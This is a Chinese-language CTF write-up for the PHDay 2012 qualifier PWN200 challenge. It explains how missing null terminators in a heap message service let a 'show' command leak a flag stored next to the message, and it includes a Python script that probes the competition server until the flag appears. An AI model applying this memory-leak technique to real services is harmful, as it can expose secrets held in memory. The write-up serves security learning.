---
title: PHDay CTF 2012 Quals PWN200
author: kelwin
layout: post
permalink: /phday-ctf-2012-quals-pwn200/
categories:
  - CTF
  - writeup
---
这道题是一个远程的binary服务，提供了消息操作的接口，连上去会有如下提示：  
<!--more-->

  
Welcome  
1 &#8211; save message  
2 &#8211; show message  
3 &#8211; append message  
4 &#8211; rewrite message  
5 &#8211; delete message

下载下来的binary文件名位heaptaskforbin，即可推断此题的利用点为heap。使用IDA反编译分析C代码，首先注意到客户端连接上以后，一个初始化的函数做了如下操作：

1.  随机在堆上存了n个随机的message，n也是100以内的随机数
2.  将flag文件读入堆中，指针不free也不引用
3.  随机free掉堆上在步骤1中已经分配的大约n/2个message

这是将flag读入堆中的代码：

![pwn200_flag_malloc][1]

由于步骤3中free掉了很多堆上的空间，因此如果再次使用，很可能会紧挨着堆中flag的数据，因此思路是寻找堆上的内存覆盖。

仔细分析服务提供的5个操作，重点关注save/append/rewrite这三个涉及写的函数，发现这些写的操作中都有个共同的问题：

![pwn200_exploit][2]

上述代码中仅仅将输入的&#8221;\n&#8221;和&#8221;\r&#8221;换成&#8221;\0&#8243;，如果输入的字串中没有&#8221;\n&#8221;和&#8221;\r&#8221;，则堆里面写入的字符串将没有结尾符，可以利用这一点先写入无结尾符的message，如果正好跟堆中flag的位置相连，就能把字符串连带flag给show出来。

利用这个思路，先往里save256个&#8221;A&#8221;，然后show这个字符串，比对这两者差异，如果相差较多，则很可能拿到的是flag，如果不够多，只差了几个字节，那么append一些&#8221;A&#8221;，将堆中的&#8221;\0&#8243;覆盖掉，进一步探测。

    def save(buf):
        s.send("1")
        print s.recv(8192)
        s.send(buf)
        ret = s.recv(8192)
        print ret
        id_ = ret.strip().replace('\n', '').split()[-1]
        return id_
    
    def append(id_, buf):
        s.send("3")
        print s.recv(8192)
        s.send(str(id_))
        print s.recv(8192)
        s.send(buf)
        print s.recv(8192)
    
    def show(id_):
        s.send('2')
        print s.recv(8192)
        s.send(str(id_))
        print s.recv(8192)
        ret = s.recv(8192)
        print ret
        buf = ret[0:ret.find("\n")]
        return buf
    
    s=socket.socket()
    s.connect(("ctf.phdays.com", 14455))
    
    print s.recv(8192)
    
    for i in range(20000):
        slen = 256
        buf = "A" * slen
        id_ = save(buf)
        ret = show(id_)
    
        diff = len(ret) - len(buf) + 1
        if diff > 10:
            print buf
            print ret
            break
        else:
            if diff < 10:
                diff = 10
    
        while slen+diff < 1024:
            diff_buf = "A" * diff
            buf += diff_buf
            slen += diff
            append(id_, diff_buf)
            ret = show(id_)
    
            diff = len(ret) - len(buf) + 1
            diff_buf = "A" * diff
    
            if diff > 10:
                print buf
                print ret
                break
    

写完这个自动探测的程序，我第一遍跑就拿到了flag：

![pwn200_flag][3]

 [1]: http://www.blue-lotus.net/wp-content/uploads/2012/12/pwn200_flag_malloc.jpg
 [2]: http://www.blue-lotus.net/wp-content/uploads/2012/12/pwn200_exploit.jpg
 [3]: http://www.blue-lotus.net/wp-content/uploads/2012/12/pwn200_flag.jpg